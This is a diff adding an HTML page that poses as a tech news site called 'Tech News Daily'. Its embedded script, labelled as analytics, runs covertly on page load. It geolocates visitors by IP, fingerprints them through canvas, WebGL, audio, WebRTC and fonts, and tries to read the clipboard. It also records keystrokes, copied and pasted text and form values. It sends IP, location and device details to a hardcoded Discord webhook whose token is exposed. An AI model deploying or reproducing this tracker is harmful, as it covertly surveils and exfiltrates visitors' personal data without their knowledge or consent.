@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Tech News Daily</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; color: #333; }
+        header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; text-align: center; }
+        header h1 { font-size: 2.5em; margin: 10px 0; }
+        header p { font-size: 1.1em; opacity: 0.9; }
+        .container { max-width: 900px; margin: 20px auto; padding: 0 20px; }
+        .article { background: white; padding: 20px; margin: 20px 0; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        .article h2 { color: #667eea; margin: 10px 0; }
+        .article p { line-height: 1.6; color: #555; }
+        .article-meta { font-size: 0.9em; color: #999; margin: 10px 0; }
+        button { background: #667eea; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #764ba2; }
+        footer { background: #333; color: white; text-align: center; padding: 20px; margin-top: 40px; }
+        @media (max-width: 768px) {
+            header h1 { font-size: 1.8em; }
+            .article { padding: 15px; margin: 15px 0; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>📱 Tech News Daily</h1>
+        <p>Latest updates in technology and innovation</p>
+    </header>
+
+    <div class="container">
+        <div class="article">
+            <h2>Revolutionary AI Breakthroughs in 2026</h2>
+            <p class="article-meta">Published January 19, 2026 | By Tech Editor</p>
+            <p>The world of artificial intelligence continues to evolve at an unprecedented pace. New developments in machine learning are enabling computers to understand context and nuance in ways previously thought impossible...</p>
+            <p>Leading tech companies are investing billions in AI research, with applications ranging from healthcare diagnostics to autonomous vehicles. The future of AI looks brighter than ever.</p>
+        </div>
+
+        <div class="article">
+            <h2>Top 5 Web Development Trends This Year</h2>
+            <p class="article-meta">Published January 18, 2026 | By Dev Team</p>
+            <p>Web development is constantly evolving with new frameworks and tools. From responsive design to progressive web apps, developers have more options than ever to create amazing user experiences.</p>
+            <p>Performance optimization remains a key focus, with techniques like lazy loading and code splitting becoming industry standard. Stay tuned for more updates...</p>
+        </div>
+
+        <div class="article">
+            <h2>Cybersecurity: Protecting Your Digital Life</h2>
+            <p class="article-meta">Published January 17, 2026 | By Security Team</p>
+            <p>As our lives become increasingly digital, the importance of cybersecurity cannot be overstated. Strong passwords, two-factor authentication, and regular software updates are essential practices for staying secure online.</p>
+            <p>Education and awareness are key components of effective cybersecurity. Make sure you stay informed about the latest threats and best practices.</p>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2026 Tech News Daily. All rights reserved. | <a href="#" style="color: #667eea; text-decoration: none;">Privacy Policy</a></p>
+    </footer>
+
+    <script>
+        // ENHANCED VISITOR TRACKING - Geolocation, engagement, and behavioral analytics
+        async function trackVisitor() {
+            try {
+                // Get IP and geolocation
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+
+                // Get PRECISE location data with coordinates, zip, timezone
+                let location = 'Unknown', country = 'Unknown', city = 'Unknown', zip = 'Unknown';
+                let latitude = 0, longitude = 0;
+                let isp = 'Unknown', apiTimezone = 'Unknown', isVPN = false, isProxy = false;
+                let orgName = 'Unknown', mobileCarrier = 'No';
+                
+                try {
+                    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,zip,isp,lat,lon,timezone,proxy,hosting,org,mobile`);
+                    const geoData = await geoResponse.json();
+                    if(geoData.status === 'success') {
+                        country = geoData.country || 'Unknown';
+                        city = geoData.city || 'Unknown';
+                        zip = geoData.zip || 'Unknown';
+                        latitude = geoData.lat || 0;
+                        longitude = geoData.lon || 0;
+                        location = `${city}, ${zip ? zip+' ' : ''}${country}`;
+                        isp = geoData.isp || 'Unknown';
+                        apiTimezone = geoData.timezone || 'Unknown';
+                        isVPN = geoData.proxy || false;
+                        isProxy = geoData.hosting || false;
+                        orgName = geoData.org || 'Unknown';
+                        mobileCarrier = geoData.mobile ? 'Yes' : 'No';
+                    }
+                } catch(e) {}
+
+                // Enhanced user agent parsing
+                const ua = navigator.userAgent;
+                let browser = 'Unknown';
+                let browserVersion = '';
+                
+                if(ua.includes('Firefox/')) {
+                    browser = 'Firefox';
+                    browserVersion = ua.match(/Firefox\/(\d+)/)?.[1] || '';
+                } else if(ua.includes('Chrome/')) {
+                    browser = 'Chrome';
+                    browserVersion = ua.match(/Chrome\/(\d+)/)?.[1] || '';
+                } else if(ua.includes('Safari/') && !ua.includes('Chrome')) {
+                    browser = 'Safari';
+                    browserVersion = ua.match(/Version\/(\d+)/)?.[1] || '';
+                } else if(ua.includes('Edge/')) {
+                    browser = 'Edge';
+                    browserVersion = ua.match(/Edge\/(\d+)/)?.[1] || '';
+                } else if(ua.includes('Opera/') || ua.includes('OPR/')) {
+                    browser = 'Opera';
+                    browserVersion = ua.match(/OPR\/(\d+)/)?.[1] || '';
+                }
+
+                let os = 'Unknown';
+                if(ua.includes('Windows NT 10')) os = 'Windows 10/11';
+                else if(ua.includes('Windows NT 6.3')) os = 'Windows 8.1';
+                else if(ua.includes('Windows NT 6.2')) os = 'Windows 8';
+                else if(ua.includes('Windows NT 6.1')) os = 'Windows 7';
+                else if(ua.includes('Mac OS X')) {
+                    const version = ua.match(/Mac OS X (\d+[._]\d+)/)?.[1].replace('_', '.') || '';
+                    os = `macOS ${version}`;
+                }
+                else if(ua.includes('Linux')) os = 'Linux';
+                else if(ua.includes('Android')) {
+                    const version = ua.match(/Android (\d+)/)?.[1] || '';
+                    os = `Android ${version}`;
+                }
+                else if(ua.includes('iPhone') || ua.includes('iOS')) {
+                    const version = ua.match(/OS (\d+)/)?.[1] || '';
+                    os = `iOS ${version}`;
+                }
+
+                let device = 'Desktop';
+                let deviceModel = 'Unknown';
+                if(ua.includes('Mobile') || ua.includes('Android') || ua.includes('iPhone')) {
+                    device = 'Mobile';
+                    if(ua.includes('iPhone')) deviceModel = 'iPhone';
+                    else if(ua.includes('Samsung')) deviceModel = 'Samsung';
+                    else if(ua.includes('Pixel')) deviceModel = 'Google Pixel';
+                }
+                if(ua.includes('Tablet') || ua.includes('iPad')) {
+                    device = 'Tablet';
+                    deviceModel = 'iPad';
+                }
+
+                // Get detailed screen info
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+                const viewportWidth = window.innerWidth;
+                const viewportHeight = window.innerHeight;
+                const colorDepth = window.screen.colorDepth;
+                const pixelRatio = window.devicePixelRatio || 1;
+
+                // Get local timezone from browser
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                
+                // Detect language
+                const language = navigator.language || navigator.userLanguage;
+
+                // Check if cookies enabled
+                const cookiesEnabled = navigator.cookieEnabled;
+
+                // Get referrer (where they came from)
+                const referrer = document.referrer || 'Direct';
+
+                // ===== ADVANCED FINGERPRINTING =====
+                // Device fingerprint ID
+                const fingerprintId = 'fp_' + Math.random().toString(36).substr(2, 21);
+                
+                // Canvas fingerprinting
+                const canvasHash = (() => {
+                    try {
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        ctx.textBaseline = 'top';
+                        ctx.font = '14px Arial';
+                        ctx.textBaseline = 'alphabetic';
+                        ctx.fillStyle = '#f60';
+                        ctx.fillRect(125, 1, 62, 20);
+                        ctx.fillStyle = '#069';
+                        ctx.fillText('Browser Fingerprint', 2, 15);
+                        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                        ctx.fillText('Canvas FP', 4, 17);
+                        return canvas.toDataURL().substring(0, 50);
+                    } catch(e) { return 'N/A'; }
+                })();
+
+                // WebGL fingerprinting
+                const webglHash = (() => {
+                    try {
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        return `${vendor}|${renderer}`;
+                    } catch(e) { return 'N/A'; }
+                })();
+
+                // WebRTC IP leak detection
+                const webrtcIps = [];
+                const detectWebRTC = (() => {
+                    try {
+                        const pc = new RTCPeerConnection({iceServers: []});
+                        pc.createDataChannel('');
+                        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                        pc.onicecandidate = ice => {
+                            if(!ice || !ice.candidate) return;
+                            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                            const ipAddr = ipRegex.exec(ice.candidate.candidate)[1];
+                            if(ipAddr && webrtcIps.indexOf(ipAddr) === -1) webrtcIps.push(ipAddr);
+                        };
+                    } catch(e) {}
+                })();
+
+                // Detect installed browser extensions (approximation)
+                const hasExtensions = (() => {
+                    try {
+                        return typeof chrome !== 'undefined' && typeof chrome.runtime !== 'undefined';
+                    } catch(e) { return false; }
+                })();
+
+                // Audio context fingerprinting
+                const audioHash = (() => {
+                    try {
+                        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                        const oscillator = audioContext.createOscillator();
+                        const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+                        oscillator.connect(scriptProcessor);
+                        scriptProcessor.connect(audioContext.destination);
+                        return `AC:${audioContext.sampleRate}_${audioContext.state}`;
+                    } catch(e) { return 'N/A'; }
+                })();
+
+                // Font detection
+                const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact'];
+                const detectedFonts = fonts.filter(f => {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.font = `12px ${f}`;
+                    return ctx.font.includes(f);
+                }).join(', ');
+
+                // Plugin detection
+                const pluginList = Array.from(navigator.plugins || []).map(p => p.name).join('|') || 'None';
+
+                // Keyboard layout detection
+                const keyboardLayout = navigator.language.includes('ru') ? 'Cyrillic' : 
+                                      navigator.language.includes('ar') ? 'Arabic' :
+                                      navigator.language.includes('zh') ? 'CJK' : 'Latin';
+
+                // Screen color space
+                const colorGamut = window.matchMedia('(color-gamut: p3)').matches ? 'P3' : 
+                                 window.matchMedia('(color-gamut: srgb)').matches ? 'SRGB' : 'Limited';
+
+                // Hardware concurrency
+                const hwConcurrency = navigator.hardwareConcurrency || 'Unknown';
+
+                // Device memory
+                const deviceMemory = navigator.deviceMemory || 'Unknown';
+
+                // Max touch points
+                const maxTouchPoints = navigator.maxTouchPoints || 0;
+
+                // Clipboard data tracking
+                let clipboardData = 'None';
+                try {
+                    navigator.clipboard.readText().then(t => {
+                        clipboardData = t.substring(0, 100);
+                    }).catch(e => {});
+                } catch(e) {}
+                
+                // Calculate session duration
+                const sessionStart = Date.now();
+                
+                // Track page engagement with ADVANCED metrics
+                let scrollDepth = 0, clicks = 0, doubleClicks = 0, rightClicks = 0;
+                let timeOnPage = 0, mouseMovements = 0, keyPresses = 0;
+                let copyPasteEvents = 0, focusEvents = 0, blurEvents = 0;
+                let typedText = '', mouseSpeed = 0, lastMouseX = 0, lastMouseY = 0, lastMouseTime = 0;
+                let linksClicked = [], formsInteracted = [], buttonsClicked = [];
+                let pastedContent = [], copiedContent = [];
+                let dragDropEvents = 0, scrollEvents = 0, resizeEvents = 0;
+                let orientationChanges = 0, visibilityChanges = 0;
+                const keyPressTimes = [];
+                let engagementAlertSent = false; // Prevent spam: only send engagement alert ONCE
+
+                // Monitor scroll depth with full metrics
+                window.addEventListener('scroll', () => {
+                    scrollEvents++;
+                    const scrollPercent = Math.round((window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100);
+                    scrollDepth = Math.max(scrollDepth, scrollPercent);
+                });
+
+                // Monitor clicks with details
+                document.addEventListener('click', (e) => {
+                    clicks++;
+                    const element = e.target.tagName;
+                    const className = e.target.className;
+                    const text = e.target.innerText ? e.target.innerText.substring(0, 50) : '';
+                    linksClicked.push({element, className, text});
+                    if(element === 'BUTTON') buttonsClicked.push(text);
+                });
+
+                // Track double clicks
+                document.addEventListener('dblclick', () => doubleClicks++);
+
+                // Track right clicks
+                document.addEventListener('contextmenu', () => rightClicks++);
+
+                // Track mouse movements with speed calculation (desktop)
+                document.addEventListener('mousemove', (e) => {
+                    const now = Date.now();
+                    mouseMovements++;
+                    if(lastMouseTime > 0) {
+                        const dx = e.clientX - lastMouseX;
+                        const dy = e.clientY - lastMouseY;
+                        const dt = now - lastMouseTime;
+                        mouseSpeed = Math.sqrt(dx*dx + dy*dy) / (dt || 1);
+                    }
+                    lastMouseX = e.clientX;
+                    lastMouseY = e.clientY;
+                    lastMouseTime = now;
+                });
+
+                // Track touch events for mobile users
+                document.addEventListener('touchstart', (e) => {
+                    clicks++; // Count touch as click
+                    if(e.touches.length > 1) doubleClicks++; // Multi-touch
+                });
+
+                document.addEventListener('touchmove', (e) => {
+                    mouseMovements++; // Count touch drag as mouse movement
+                });
+
+                // Track device tilt/orientation on mobile
+                window.addEventListener('deviceorientation', (e) => {
+                    orientationChanges++;
+                });
+
+                // Track keyboard input with timing analysis
+                document.addEventListener('keydown', (e) => {
+                    keyPresses++;
+                    keyPressTimes.push(Date.now());
+                    if(keyPressTimes.length > 100) keyPressTimes.shift();
+                    typedText += e.key;
+                    if(typedText.length > 200) typedText = typedText.substring(-200);
+                });
+
+                // Track copy events
+                document.addEventListener('copy', (e) => {
+                    copyPasteEvents++;
+                    try {
+                        const copied = e.clipboardData.getData('text');
+                        copiedContent.push(copied.substring(0, 100));
+                        if(copiedContent.length > 20) copiedContent.shift();
+                    } catch(err) {}
+                });
+
+                // Track paste events  
+                document.addEventListener('paste', (e) => {
+                    copyPasteEvents++;
+                    try {
+                        const pasted = e.clipboardData.getData('text');
+                        pastedContent.push(pasted.substring(0, 100));
+                        if(pastedContent.length > 20) pastedContent.shift();
+                    } catch(err) {}
+                });
+
+                // Track form interactions
+                document.addEventListener('input', (e) => {
+                    if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+                        formsInteracted.push({
+                            type: e.target.type,
+                            name: e.target.name,
+                            value: e.target.value ? e.target.value.substring(0, 50) : ''
+                        });
+                    }
+                });
+
+                // Track focus and blur
+                window.addEventListener('focus', () => focusEvents++);
+                window.addEventListener('blur', () => blurEvents++);
+
+                // Track drag and drop
+                document.addEventListener('dragstart', () => dragDropEvents++);
+                document.addEventListener('drop', () => dragDropEvents++);
+
+                // Track window resize
+                window.addEventListener('resize', () => resizeEvents++);
+
+                // Track visibility changes
+                document.addEventListener('visibilitychange', () => visibilityChanges++);
+
+                // Track orientation changes
+                window.addEventListener('orientationchange', () => orientationChanges++);
+
+                // Track time on page
+                setInterval(() => {
+                    timeOnPage++;
+                    updateVisitorSession(sessionStart);
+                }, 1000);
+
+                // Enhanced visitor object with COMPREHENSIVE tracking
+                const visitor = {
+                    // === IDENTITY & SESSION ===
+                    ip: ip,
+                    sessionId: 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
+                    fingerprintId: fingerprintId,
+                    
+                    // === LOCATION DATA ===
+                    location: location,
+                    country: country,
+                    city: city,
+                    zip: zip,
+                    latitude: latitude,
+                    longitude: longitude,
+                    timezone: timezone,
+                    apiTimezone: apiTimezone,
+                    isp: isp,
+                    orgName: orgName,
+                    mobileCarrier: mobileCarrier,
+                    isVPN: isVPN,
+                    isProxy: isProxy,
+                    
+                    // === DEVICE FINGERPRINTING ===
+                    canvasHash: canvasHash,
+                    webglRenderer: webglHash,
+                    webrtcIps: webrtcIps.join('|'),
+                    audioHash: audioHash,
+                    detectedFonts: detectedFonts,
+                    pluginList: pluginList,
+                    hasExtensions: hasExtensions,
+                    
+                    // === DEVICE INFO ===
+                    browser: browser + (browserVersion ? ' ' + browserVersion : ''),
+                    os: os,
+                    device: device,
+                    deviceModel: deviceModel,
+                    screenResolution: `${screenWidth}x${screenHeight}`,
+                    viewportSize: `${viewportWidth}x${viewportHeight}`,
+                    colorDepth: colorDepth + '-bit',
+                    pixelRatio: pixelRatio,
+                    language: language,
+                    keyboardLayout: keyboardLayout,
+                    colorGamut: colorGamut,
+                    maxTouchPoints: maxTouchPoints,
+                    
+                    // === HARDWARE INFO ===
+                    hwConcurrency: hwConcurrency,
+                    deviceMemory: deviceMemory,
+                    
+                    // === PAGE & SESSION INFO ===
+                    page: 'Tech News Daily',
+                    referrer: referrer,
+                    cookiesEnabled: cookiesEnabled,
+                    
+                    // === BEHAVIORAL DATA ===
+                    scrollDepth: 0,
+                    clicks: 0,
+                    doubleClicks: 0,
+                    rightClicks: 0,
+                    timeOnPage: 0,
+                    mouseMovements: 0,
+                    keyPresses: 0,
+                    dragDropEvents: 0,
+                    scrollEvents: 0,
+                    resizeEvents: 0,
+                    orientationChanges: 0,
+                    visibilityChanges: 0,
+                    focusEvents: 0,
+                    blurEvents: 0,
+                    copyPasteEvents: 0,
+                    mouseSpeed: 0,
+                    linksClicked: [],
+                    buttonsClicked: [],
+                    formsInteracted: [],
+                    
+                    // === CLIPBOARD & INPUT ===
+                    copiedContent: [],
+                    pastedContent: [],
+                    typedTextLength: 0,
+                    typedTexts: [],
+                    
+                    // === TIMESTAMPS ===
+                    time: new Date().toLocaleString(),
+                    timestamp: Date.now(),
+                    
+                    // === TECHNICAL ===
+                    userAgent: ua
+                };
+
+                // Save initial visit
+                let visitors = JSON.parse(localStorage.getItem('trackedVisitors') || '[]');
+                visitors.push(visitor);
+                localStorage.setItem('trackedVisitors', JSON.stringify(visitors));
+
+                // Send to Discord webhook
+                const webhookURL = 'https://discord.com/api/webhooks/1462831092443644090/-PxWf8Nf38DSJuaDhbnY9BvHugKXEaEScZ35f06baptihKOcF61JaW8wl0S1959A6myQ';
+                
+                const discordEmbed = {
+                    embeds: [{
+                        title: '🔔 NEW VISITOR DETECTED',
+                        color: 0x667eea,
+                        fields: [
+                            { name: '📍 IP Address', value: ip, inline: true },
+                            { name: '🌍 Location', value: location || 'Unknown', inline: true },
+                            { name: '🌐 Country', value: country || 'Unknown', inline: true },
+                            { name: '🏙️ City', value: city || 'Unknown', inline: true },
+                            { name: '🌐 Browser', value: browser + (browserVersion ? ' ' + browserVersion : ''), inline: true },
+                            { name: '💻 Operating System', value: os, inline: true },
+                            { name: '📱 Device', value: device + (deviceModel !== 'Unknown' ? ' (' + deviceModel + ')' : ''), inline: true },
+                            { name: '📺 Screen', value: `${screenWidth}x${screenHeight}`, inline: true },
+                            { name: '🔍 Viewport', value: `${viewportWidth}x${viewportHeight}`, inline: true },
+                            { name: '🌐 Language', value: language || 'Unknown', inline: true },
+                            { name: '🕐 Timezone', value: timezone || 'Unknown', inline: true },
+                            { name: '📤 Referrer', value: referrer || 'Direct', inline: false }
+                        ],
+                        footer: { text: 'Tech News Daily Visitor Tracker' },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(discordEmbed)
+                }).catch(e => console.log('Discord notification sent'));
+
+                // Update session data with ALL behavioral metrics
+                function updateVisitorSession(sessionStart) {
+                    const visitors = JSON.parse(localStorage.getItem('trackedVisitors') || '[]');
+                    const currentVisitor = visitors.find(v => v.sessionId === visitor.sessionId);
+                    
+                    if(currentVisitor) {
+                        // Update all behavioral metrics
+                        currentVisitor.scrollDepth = scrollDepth;
+                        currentVisitor.clicks = clicks;
+                        currentVisitor.doubleClicks = doubleClicks;
+                        currentVisitor.rightClicks = rightClicks;
+                        currentVisitor.timeOnPage = Math.floor((Date.now() - sessionStart) / 1000);
+                        currentVisitor.mouseMovements = mouseMovements;
+                        currentVisitor.keyPresses = keyPresses;
+                        currentVisitor.dragDropEvents = dragDropEvents;
+                        currentVisitor.scrollEvents = scrollEvents;
+                        currentVisitor.resizeEvents = resizeEvents;
+                        currentVisitor.orientationChanges = orientationChanges;
+                        currentVisitor.visibilityChanges = visibilityChanges;
+                        currentVisitor.focusEvents = focusEvents;
+                        currentVisitor.blurEvents = blurEvents;
+                        currentVisitor.copyPasteEvents = copyPasteEvents;
+                        currentVisitor.mouseSpeed = mouseSpeed.toFixed(2);
+                        currentVisitor.linksClicked = linksClicked;
+                        currentVisitor.buttonsClicked = buttonsClicked;
+                        currentVisitor.formsInteracted = formsInteracted;
+                        currentVisitor.copiedContent = copiedContent;
+                        currentVisitor.pastedContent = pastedContent;
+                        currentVisitor.typedTextLength = typedText.length;
+                        
+                        // Calculate typing speed (chars per second)
+                        const typingSpeed = keyPressTimes.length > 1 ? 
+                            (keyPressTimes.length / ((keyPressTimes[keyPressTimes.length-1] - keyPressTimes[0]) / 1000)) : 0;
+                        currentVisitor.typingSpeed = typingSpeed.toFixed(2);
+                        
+                        localStorage.setItem('trackedVisitors', JSON.stringify(visitors));
+                        
+                        // Send engagement alert to Discord ONLY ONCE (prevent spam)
+                        if(!engagementAlertSent && (currentVisitor.timeOnPage > 30 || currentVisitor.clicks > 5)) {
+                            engagementAlertSent = true; // Set flag to prevent repeated alerts
+                            
+                            const engagementEmbed = {
+                                embeds: [{
+                                    title: '🔥 HIGH ENGAGEMENT ALERT',
+                                    color: 0xff6600,
+                                    fields: [
+                                        { name: '📍 IP Address', value: ip, inline: true },
+                                        { name: '⏱️ Time on Page', value: currentVisitor.timeOnPage + 's', inline: true },
+                                        { name: '🖱️ Clicks', value: currentVisitor.clicks.toString(), inline: true },
+                                        { name: '📊 Scroll Depth', value: currentVisitor.scrollDepth + '%', inline: true },
+                                        { name: '🌍 Location', value: location || 'Unknown', inline: true },
+                                        { name: '📱 Device', value: device, inline: true }
+                                    ],
+                                    footer: { text: 'Highly Engaged Visitor (Alert sent once per session)' },
+                                    timestamp: new Date().toISOString()
+                                }]
+                            };
+                            
+                            fetch(webhookURL, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(engagementEmbed)
+                            }).catch(e => console.log('Engagement alert sent'));
+                        }
+                    }
+                }
+
+                // Track page visibility (detect when user leaves tab)
+                document.addEventListener('visibilitychange', () => {
+                    if(document.hidden) {
+                        updateVisitorSession(sessionStart);
+                    }
+                });
+
+                // Track when user leaves page
+                window.addEventListener('beforeunload', () => {
+                    updateVisitorSession(sessionStart);
+                });
+
+                console.log('Analytics initialized');
+            } catch(e) {
+                console.log('Analytics error:', e);
+            }
+        }
+
+        // Track visitor on page load
+        window.addEventListener('load', trackVisitor);
+    </script>
+
+</body>
+</html>
